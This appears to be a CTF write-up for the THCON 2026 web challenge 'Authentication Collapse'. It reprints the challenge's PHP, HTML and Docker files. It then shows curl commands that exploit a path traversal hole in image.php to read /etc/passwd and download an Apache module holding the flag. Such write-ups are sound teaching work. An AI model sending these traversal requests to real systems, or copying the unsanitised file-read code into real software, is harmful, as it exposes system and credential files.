---
layout: post
title:  "THCity: Authentication Collapse (part 1/2)"
date:   2026-05-12 19:18:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /THCON-CTF-2026-authentication-collapse/
---

**Category**: Web

**Author**: jrjgjk from [Orange Cyberdefense](https://www.orangecyberdefense.com)

**Description**: The rogue AIs P4t4t0rZ and M4terM4xima have compromised our central SSO system. All legitimate user accounts have been wiped, and we have lost access to the robot deactivation codes.

Our DevOps engineer managed to recover a partial Docker environment to help investigate the breach.

Unfortunately, critical files are missing — backups were never completed. Your mission is to reconstruct the missing pieces.

[http://web-thcity-authentication-collapse.ctf.thcon.party:8888](http://web-thcity-authentication-collapse.ctf.thcon.party:8888)

I get the challenge files:
```shell
unzip auth.zip  
Archive:  auth.zip  
  inflating: docker/docker-compose.yml  
  inflating: docker/.env  
   creating: docker/flag_server/  
   creating: docker/flag_server/secret/  
  inflating: docker/flag_server/secret/index.php  
  inflating: docker/flag_server/Dockerfile  
   creating: docker/flag_server/images/  
  inflating: docker/flag_server/images/SST.png  
  inflating: docker/flag_server/images/matermaxima.png  
  inflating: docker/flag_server/thcon.conf  
  inflating: docker/flag_server/index.html  
  inflating: docker/flag_server/image.php  
   creating: docker/sso_server/  
  inflating: docker/sso_server/package.json  
  inflating: docker/sso_server/Dockerfile  
  inflating: docker/sso_server/index.js  
   creating: docker/sso_server/public/  
  inflating: docker/sso_server/public/index.html
```

`image.php`:
```php
<?php

$img = "./images/" . $_GET["img"] ?? "";
if(is_file($img)){
  $mime = mime_content_type($img);
  if($mime){
    header("Content-Type: $mime");
  }
  readfile($img);
}
```
This allows for path traversal/LFI.

`secret/index.php`:
```php
<?php
$host = getenv('REDIS_HOST');
$port = getenv('REDIS_PORT');
$password = getenv('REDIS_PASSWORD');

$redis = new Redis();
try {
    $redis->connect($host, $port);
    $redis->auth($password);

    $flag = htmlspecialchars($redis->get("ctf_flag"));
    if(empty($flag)){
      die("Flag not found, chall is broken");
    }
} catch (Exception $e) {
    die("<p>Redis connection failed: " . htmlspecialchars($e->getMessage()) . "</p>");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<link rel="icon" href="../image.php?img=SST.png">
<title>SST - ROBOTS Management</title>

<style>
body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background-color: #f0f2f5;
    margin: 0;
    color: #1c1e21;
}

header {
    background: #003366;
    color: white;
    padding: 15px;
    text-align: center;
}

/* CONTENT */
.container {
    width: 90%;
    max-width: 850px;
    margin: 30px auto;
}

.module {
    background: white;
    padding: 20px;
    border: 1px solid #ddd;
    margin-bottom: 20px;
}

/* CORRUPTION */
.corrupted {
    border: 2px solid #c0392b;
    box-shadow: 0 0 15px red;
    background: #1a0000;
    color: #ffcccc;
    font-family: monospace;
}

.flag {
    background: black;
    border: 1px dashed red;
    padding: 10px;
    margin-top: 10px;
    color: #ff4444;
}

/* BUTTON */
button {
    background: #003366;
    color: white;
    padding: 10px;
    border: none;
    cursor: pointer;
}

button:hover {
    background: #c0392b;
}
</style>
</head>

<body>

<header>
    <h1>SST - Confidential Security Code</h1>
</header>

<div class="container">

    <div class="module">
        <h2>System Status</h2>
        <p>Status: <b>UP</b></p>
        <p>Origin: <b>SST factory</b></p>
        <p>Owner: <b>P4t4t0rz</b></p>
    </div>

    <div class="module corrupted">
        <h2>ROBOT Deactivation code</h2>

        <button>Execute Deactivation</button>
        <p>They shall have checked their skibidi security - P4t4t0rz</p>

        <div class="flag">
            <?= $flag ?>
        </div>
    </div>

    <div class="module">
        <h2>System Logs</h2>
        <p>> SSO token accepted</p>
        <p>> Authentication successfull</p>
    </div>

</div>

</body>
</html>
```

`index.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<link rel="icon" href="/image.php?img=SST.png">
<title>SST Secure Access Portal</title>

<style>
html, body {
    height: 100%;
    margin: 0;
}

body {
    display: flex;
    flex-direction: column;
    font-family: 'Segoe UI', Arial, sans-serif;
    background-color: #f0f2f5;
    color: #1c1e21;
}

.content {
    flex: 1 0 auto;
    width: 90%;
    max-width: 850px;
    margin: 30px auto;
}

header {
    background-color: #ffffff;
    border-bottom: 1px solid #ddd;
}

.header-container {
    width: 90%;
    max-width: 850px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    padding: 15px 0;
}

h1 { margin: 0; font-size: 1.4rem; color: #003366; }

.main-nav { background: #003366; }

.main-nav ul { list-style: none; margin: 0; padding: 0; display: flex; }

.main-nav li a {
    color: white;
    text-decoration: none;
    padding: 12px 20px;
    display: block;
}

/* === CORRUPTION LAYER === */
.defaced {
    background: #0d0d0d;
    color: #e0e0e0;
    border: 2px solid #c0392b;
    box-shadow: 0 0 20px #c0392b;
    font-family: 'Consolas', monospace;

    margin: 20px auto;
    padding: 40px; /* espace interne */
    max-width: 700px; /* évite que ça prenne toute la largeur */
    transition: all 0.3s ease;
}

.defaced:hover {
    box-shadow: 0 0 30px red;
    transform: scale(1.01);
}

.defaced h2 {
    color: #c0392b;
    text-shadow: 0 0 8px red;
}

.defaced-content { display: flex; align-items: center; gap: 25px; }
.defaced-content img {
    display: block;
}

.glitch {
    animation: glitch 1s infinite;
}

@keyframes glitch {
    0% { text-shadow: 2px 2px red; }
    50% { text-shadow: -2px -2px crimson; }
    100% { text-shadow: 2px 2px red; }
}

a.sso {
    display: inline-block;
    margin-top: 20px;
    padding: 12px 20px;
    background: #c0392b;
    color: white;
    text-decoration: none;
    font-weight: bold;
    transition: all 0.3s ease;
}

a.sso:hover {
    background: #e74c3c;
    box-shadow: 0 0 10px red;
}

footer {
    text-align: center;
    padding: 20px;
    background: #fff;
    border-top: 1px solid #ddd;
    color: #888;
    font-size: 0.8rem;
}
</style>
</head>

<body>

<header>
    <div class="header-container">
        <h1><img src="image.php?img=SST.png" alt="SST Icon"
                 style="width:6em;height:2.8em;vertical-align: middle;padding-right: 5px;"/>
        SST Factory Secure Portal</h1>
    </div>
</header>

<nav class="main-nav">
    <ul>
        <li><a href="#"><strike>Home</strike></a></li>
        <li><a href="#"><strike>Robots</strike></a></li>
    </ul>
</nav>

<div class="content">

    <div class="defaced">
        <h2 class="glitch">>> ACCESS HIJACKED <<</h2>

        <div class="defaced-content">
        <img src="/image.php?img=matermaxima.png" alt="M4terM4xima"
             style="width:150px; border:2px solid red; box-shadow:0 0 10px red; margin-bottom:20px;">
        <div>
        <p>
            This site has been seized 💀 <br>
            Skibidi Robots belong to us - P4t4t0rz
        </p>

        <p>
            Original owner: THCity Administration <br>
            Current owner: M4terM4xima 😎
        </p>

        <p>
            SSO accounts has been changed...
        </p>
      </div>
    </div>

        <a href="/secret/" class="sso">Robots deactivation code</a>

        <pre>
> system logs:
> migrated from legacy THCity.gov node
> security level: undefined
> weak credentials
        </pre>
    </div>

</div>

<footer>
    SST Administration Portal © 2123 — Owned by <b>M4terM4xima</b>
</footer>

</body>
</html>
```

`docker-compose.yml`:
```yaml
networks:
  ctf-net:
    driver: bridge

services:
  express_app:
    build: ./sso_server
    container_name: express_sso
    restart: unless-stopped
    networks:
      - ctf-net
    environment:
      EXPRESS_DEBUG: ${EXPRESS_DEBUG}

  flag_app:
    build:
      context: ./flag_server
      args:
        FLAG: ${FLAG1}
        APACHE_DEBUG: ${APACHE_DEBUG}
    ports:
      - "8888:80"
    restart: unless-stopped
    environment:
      REDIS_HOST: redis
      REDIS_PORT: 6379
    networks:
      - ctf-net

  redis:
    image: redis:7
    container_name: redis_ctf
    command: >
      sh -c "redis-server --protected-mode no &
             sleep 2 &&
             redis-cli SET ctf_flag '${FLAG}' &&
             wait
             "
    networks:
      - ctf-net
```

`.env`:
```shell
cat docker/.env  
FLAG1=THCON{REDACTED}  
FLAG=THCON{REDACTED}  
EXPRESS_DEBUG=false # Set to "true" for debug  
APACHE_DEBUG=false # Set to "true" for debug
```

I go to the site:

![Alt text](/images/thconweb1.png)

I find LFI/path traversal:
```shell
curl http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

To get the flag I download `mod_auth_thcity.so`: 
```shell
curl http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../usr/lib/apache2/modules/mod_auth_thcity.so --output mod_auth_thcity.so  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100 40024    0 40024    0     0  50816      0 --:--:-- --:--:-- --:--:-- 50791  
```

Once the module is downloaded I use `strings` and `grep` to get the flag:
```shell
file mod_auth_thcity.so  
image.php: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=a14fb7f9d4387c0d8040e31ff46b01f3a2f6ab10, with debug_info, not stripped  

strings mod_auth_thcity.so | grep "THC{"  
THC{L34k_Ap4ch3_m0dul3_fR0m_F1l3_r3@d}
```

`THC{L34k_Ap4ch3_m0dul3_fR0m_F1l3_r3@d}`
